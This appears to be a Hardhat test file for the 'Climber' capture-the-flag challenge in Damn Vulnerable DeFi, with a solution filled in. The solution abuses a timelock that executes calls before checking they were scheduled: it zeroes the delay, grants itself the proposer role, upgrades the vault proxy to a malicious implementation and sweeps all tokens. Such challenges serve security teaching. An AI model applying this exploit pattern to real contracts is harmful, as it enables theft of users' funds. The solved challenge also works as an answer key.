const { ethers, upgrades } = require("hardhat");
const { expect } = require("chai");
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

describe("[Challenge] Climber", function () {
    let deployer, proposer, sweeper, player;
    let timelock, vault, token;

    const VAULT_TOKEN_BALANCE = 10000000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
    const TIMELOCK_DELAY = 60 * 60;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, player] = await ethers.getSigners();

        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = await upgrades.deployProxy(
            await ethers.getContractFactory("ClimberVault", deployer),
            [deployer.address, proposer.address, sweeper.address],
            { kind: "uups" }
        );

        expect(await vault.getSweeper()).to.eq(sweeper.address);
        expect(await vault.getLastWithdrawalTimestamp()).to.be.gt(0);
        expect(await vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await vault.owner()).to.not.eq(deployer.address);

        // Instantiate timelock
        let timelockAddress = await vault.owner();
        timelock = await (await ethers.getContractFactory("ClimberTimelock", deployer)).attach(timelockAddress);

        // Ensure timelock delay is correct and cannot be changed
        expect(await timelock.delay()).to.eq(TIMELOCK_DELAY);
        await expect(timelock.updateDelay(TIMELOCK_DELAY + 1)).to.be.revertedWithCustomError(timelock, "CallerNotTimelock");

        // Ensure timelock roles are correctly initialized
        expect(await timelock.hasRole(ethers.utils.id("PROPOSER_ROLE"), proposer.address)).to.be.true;
        expect(await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), deployer.address)).to.be.true;
        expect(await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), timelock.address)).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        token = await (await ethers.getContractFactory("DamnValuableToken", deployer)).deploy();
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);
    });

    it("Execution", async function () {
        /** CODE YOUR SOLUTION HERE */
        /**
         * Attack plan (through Attacker):
         * - Set delay to 0 (since it has no access control)
         * - Grant proposer role to Attacker
         * - Schedule 'schedule' call on Attacker to make these 3 calls have `OperationState.ReadyForExecution` state
         *
         * Now that we have the proposer role, we can upgrade ClimberVault to MaliciousVault and sweep funds
         */

        // Deploy Attacker
        const AttackerClimberFactory = await ethers.getContractFactory("AttackerClimber");
        const attackerClimber = await AttackerClimberFactory.deploy(timelock.address);

        const salt = ethers.utils.id("random_salt");
        const PROPOSER_ROLE = "0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1";

        // Execute actions:
        // 1. Set delay to 0
        const updateDelayInterface = new ethers.utils.Interface(["function updateDelay(uint64)"]);
        const updateDelayCalldata = updateDelayInterface.encodeFunctionData("updateDelay", [0]);

        // 2. Grant proposer role to attacker
        const grantRoleInterface = new ethers.utils.Interface(["function grantRole(bytes32, address)"]);
        const grantRoleCalldata = grantRoleInterface.encodeFunctionData("grantRole", [PROPOSER_ROLE, attackerClimber.address]);

        // 3. Self-schedule previous actions during execute, so they are in `OperationState.ReadyForExecution`
        const selfScheduleInterface = new ethers.utils.Interface(["function selfSchedule(bytes32)"]);
        const selfScheduleCalldata = selfScheduleInterface.encodeFunctionData("selfSchedule", [salt]);

        const calldatas = [updateDelayCalldata, grantRoleCalldata, selfScheduleCalldata];
        const targets = [timelock.address, timelock.address, attackerClimber.address];
        const values = [0, 0, 0];

        await attackerClimber.setCalldatas(calldatas);
        await attackerClimber.setTargets(targets);
        await attackerClimber.setValues(values);

        // Trigger execution
        await timelock.execute(targets, values, calldatas, salt);

        // Check if we have the role
        // expect(await timelock.hasRole(PROPOSER_ROLE, attackerClimber.climber)).to.be.equal(true);

        // Deploy malicious vault
        const MaliciousClimberVaultFactory = await ethers.getContractFactory("MaliciousClimberVault");
        const maliciousVault = await MaliciousClimberVaultFactory.deploy();

        // Schedule malicious upgrade
        const upgradeInterface = new ethers.utils.Interface(["function upgradeTo(address)"]);
        const upgradeCalldata = upgradeInterface.encodeFunctionData("upgradeTo", [maliciousVault.address]);

        await attackerClimber.schedule([vault.address], [0], [upgradeCalldata], salt);
        await timelock.execute([vault.address], [0], [upgradeCalldata], salt);

        // Finally, sweep funds
        await vault.connect(player).sweepFunds(token.address);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
